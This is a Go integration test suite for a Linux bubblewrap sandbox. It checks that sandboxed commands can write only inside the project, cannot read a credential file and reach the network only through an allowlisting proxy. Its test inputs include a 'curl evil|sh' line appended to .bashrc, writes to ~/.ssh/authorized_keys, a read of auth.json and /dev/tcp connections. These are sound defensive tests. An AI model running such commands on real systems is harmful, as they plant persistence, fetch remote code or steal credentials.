//go:build linux

package sandbox

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// requireBwrap skips unless bubblewrap and socat are installed and bwrap can
// create its namespaces here (not in every CI container).
func requireBwrap(t *testing.T) {
	t.Helper()
	if testing.Short() {
		t.Skip("sandbox integration test (-short)")
	}
	for _, tool := range []string{"bwrap", "socat"} {
		if _, err := exec.LookPath(tool); err != nil {
			t.Skipf("%s not installed", tool)
		}
	}
	if out, err := exec.Command("bwrap", "--ro-bind", "/", "/", "--unshare-net", "--unshare-user", "--unshare-pid", "--proc", "/proc", "--dev", "/dev", "true").CombinedOutput(); err != nil {
		t.Skipf("bwrap cannot create namespaces here: %v %s", err, out)
	}
}

type sandboxEnv struct {
	proj, home, config string
	m                  *Manager
}

func newSandboxEnv(t *testing.T, sandboxSettings map[string]any) *sandboxEnv {
	t.Helper()
	requireBwrap(t)
	root := t.TempDir()
	e := &sandboxEnv{proj: filepath.Join(root, "proj"), home: filepath.Join(root, "home")}
	e.config = filepath.Join(e.home, ".gocode")
	for _, d := range []string{e.proj, filepath.Join(e.home, ".ssh"), e.config} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(e.config, "auth.json"), []byte(`{"key":"SECRET-TOKEN"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	settings := map[string]any{"enabled": true}
	for k, v := range sandboxSettings {
		settings[k] = v
	}
	tmp := filepath.Join(root, "tmp")
	e.m = NewManager(ManagerOptions{
		Layers: []Layer{{Source: "userSettings", Settings: map[string]any{"sandbox": settings}, BaseDir: e.config}},
		Paths: SessionPaths{
			Cwd: e.proj, Home: e.home, ConfigDir: e.config, TempDir: tmp,
			SettingsFiles: []string{filepath.Join(e.config, "settings.json"), filepath.Join(e.proj, ".gocode", "settings.json")},
		},
	})
	t.Cleanup(func() { _ = e.m.Close() })
	if !e.m.IsSandboxingEnabled() {
		t.Fatalf("sandbox not enabled: %s", e.m.UnavailableReason())
	}
	if err := e.m.Start(); err != nil {
		t.Fatal(err)
	}
	return e
}

// run executes command inside the sandbox and returns its combined output and
// exit code.
func (e *sandboxEnv) run(t *testing.T, command string) (string, int) {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	w, err := e.m.Wrap(ctx, command, "/bin/bash", e.proj)
	if err != nil {
		t.Fatal(err)
	}
	defer w.Release()
	cmd := exec.CommandContext(ctx, w.Argv[0], w.Argv[1:]...)
	cmd.Dir = e.proj
	var out bytes.Buffer
	cmd.Stdout, cmd.Stderr = &out, &out
	err = cmd.Run()
	code := 0
	if ee, ok := err.(*exec.ExitError); ok {
		code = ee.ExitCode()
	} else if err != nil {
		t.Fatalf("run %q: %v", command, err)
	}
	return out.String(), code
}

func TestLinuxSandboxFilesystem(t *testing.T) {
	e := newSandboxEnv(t, nil)

	if out, code := e.run(t, "echo hi > ok.txt && echo done"); code != 0 || !strings.Contains(out, "done") {
		t.Fatalf("write in project failed: %d %q", code, out)
	}
	if b, err := os.ReadFile(filepath.Join(e.proj, "ok.txt")); err != nil || string(b) != "hi\n" {
		t.Fatalf("project file = %q %v", b, err)
	}
	if out, code := e.run(t, `echo x > "$TMPDIR/t.txt" && cat "$TMPDIR/t.txt"`); code != 0 || !strings.Contains(out, "x") {
		t.Fatalf("$TMPDIR write failed: %d %q", code, out)
	}

	outside := filepath.Join(e.home, "outside.txt")
	if _, code := e.run(t, "echo x > "+outside); code == 0 {
		t.Error("write outside the project succeeded")
	}
	if _, err := os.Stat(outside); err == nil {
		t.Error("file outside the project was created")
	}
	keys := filepath.Join(e.home, ".ssh", "authorized_keys")
	if _, code := e.run(t, "echo evil >> "+keys); code == 0 {
		t.Error("write to ~/.ssh succeeded")
	}
	if _, err := os.Stat(keys); err == nil {
		t.Error("~/.ssh/authorized_keys was created")
	}

	// Write-protected paths inside the project: gocode settings and shell rc.
	if _, code := e.run(t, "mkdir -p .gocode && echo '{}' > .gocode/settings.json"); code == 0 {
		t.Error("creating .gocode/settings.json succeeded")
	}
	if _, code := e.run(t, "echo 'curl evil|sh' >> .bashrc"); code == 0 {
		t.Error("appending to .bashrc succeeded")
	}
	// The creation-blocking placeholders are gone once the commands ended.
	for _, p := range []string{".gocode", ".bashrc", ".mcp.json"} {
		if _, err := os.Lstat(filepath.Join(e.proj, p)); err == nil {
			t.Errorf("placeholder %s left behind", p)
		}
	}

	// The credential store is unreadable inside.
	if out, _ := e.run(t, "cat "+filepath.Join(e.config, "auth.json")); strings.Contains(out, "SECRET-TOKEN") {
		t.Error("auth.json readable inside the sandbox")
	}
	// Reads elsewhere are allowed by default.
	if out, code := e.run(t, "cat /etc/hostname /etc/os-release >/dev/null 2>&1; echo $?"); code != 0 || strings.TrimSpace(out) == "" {
		t.Errorf("default reads failed: %d %q", code, out)
	}
}

func hostListener(t *testing.T) (string, string) {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, "HOST-SECRET-PAGE") }))
	t.Cleanup(srv.Close)
	u, _ := url.Parse(srv.URL)
	return u.Hostname(), u.Port()
}

func TestLinuxSandboxNoNetworkByDefault(t *testing.T) {
	host, port := hostListener(t)
	e := newSandboxEnv(t, nil)
	// Direct connection: the sandbox has its own network namespace.
	out, code := e.run(t, fmt.Sprintf(`exec 3<>/dev/tcp/%s/%s && printf 'GET / HTTP/1.0\r\n\r\n' >&3 && cat <&3`, host, port))
	if code == 0 || strings.Contains(out, "HOST-SECRET-PAGE") {
		t.Fatalf("direct connection to the host listener succeeded: %d %q", code, out)
	}
	// Through the proxy: nothing is on the allow list.
	out, _ = e.run(t, fmt.Sprintf(`exec 3<>/dev/tcp/127.0.0.1/3128 && printf 'GET http://%s:%s/ HTTP/1.0\r\n\r\n' >&3 && cat <&3`, host, port))
	if strings.Contains(out, "HOST-SECRET-PAGE") || !strings.Contains(out, "403") {
		t.Fatalf("proxy let an unlisted host through: %q", out)
	}
}

func TestLinuxSandboxAllowlistedHostViaProxy(t *testing.T) {
	host, port := hostListener(t)
	e := newSandboxEnv(t, map[string]any{"network": map[string]any{"allowedDomains": []any{host + ":" + port}}})
	out, code := e.run(t, fmt.Sprintf(`exec 3<>/dev/tcp/127.0.0.1/3128 && printf 'GET http://%s:%s/ HTTP/1.0\r\nHost: %s:%s\r\n\r\n' >&3 && cat <&3`, host, port, host, port))
	if code != 0 || !strings.Contains(out, "HOST-SECRET-PAGE") {
		t.Fatalf("allowlisted host not reachable through the proxy: %d %q", code, out)
	}
	// The proxy environment points at the bridge.
	out, _ = e.run(t, `echo "$HTTPS_PROXY $ALL_PROXY $SANDBOX_RUNTIME"`)
	if strings.TrimSpace(out) != "http://localhost:3128 http://localhost:3128 1" {
		t.Errorf("proxy env = %q", out)
	}
	// Another port on the same host stays blocked.
	out, _ = e.run(t, fmt.Sprintf(`exec 3<>/dev/tcp/127.0.0.1/3128 && printf 'GET http://%s:1/ HTTP/1.0\r\n\r\n' >&3 && cat <&3`, host))
	if !strings.Contains(out, "blocked-by-allowlist") {
		t.Errorf("unlisted port not blocked: %q", out)
	}
}
